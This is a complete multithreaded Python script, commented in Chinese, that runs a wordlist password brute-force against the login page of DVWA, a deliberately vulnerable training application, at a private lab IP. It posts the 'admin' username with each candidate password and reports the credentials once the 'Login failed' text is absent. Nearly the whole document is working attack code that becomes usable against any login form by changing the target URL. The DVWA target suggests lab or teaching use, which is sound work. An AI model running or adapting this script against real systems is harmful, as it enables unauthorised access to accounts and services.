import requests
import threading
import queue

# 设置基本参数
user_thread = 10
username = "admin"
wordlist_file = "pass1000.txt"
target_url = "http://172.16.100.103/dvwa/login.php"
success_check = "Login failed"


# 定义类
class Bruter(object):
    # 初始化时需传参，接受用户名，密码参数
    def __init__(self, username, words):
        self.username = username
        self.password_q = words
        self.found = False
        print("Finished setting up for: %s" % username)
    
    # 定义类中多线程方法
    def run_bruteforce(self):
        for i in range(user_thread):
            t = threading.Thread(target=self.web_bruter)
            t.start()

    # 定义构造http请求包方法
    def web_bruter(self):
        while not self.password_q.empty() and not self.found:
            brute = self.password_q.get().rstrip()
            post_tags = {'username': 'admin', 'password': brute,'Login':'Login'}
            print("\b\b"*100, end="")
            print("\rTrying: %s : %s (%d left)" % (self.username, brute.decode('utf-8'), self.password_q.qsize()), end="")
            login_response = requests.post(target_url, data=post_tags)
            login_result = login_response.text
            if success_check not in login_result:
                self.found = True
                print("\n[*] Bruteforce successful.")
                print("[*] Username: %s" % username)
                print("[*] Password: %s" % brute.decode('utf-8'))
                print("[*] Waiting for other th"
                      "reads to exit...")


# 定义列举密码并发送函数
def build_wordlist(wordlist_file):
    fd = open(wordlist_file, "rb")
    raw_words = fd.readlines()
    fd.close()

    words = queue.Queue()

    for word in raw_words:
        word = word.rstrip()
        words.put(word)
    return words

# 运用
words = build_wordlist(wordlist_file)
bruter_obj = Bruter(username, words)
bruter_obj.run_bruteforce()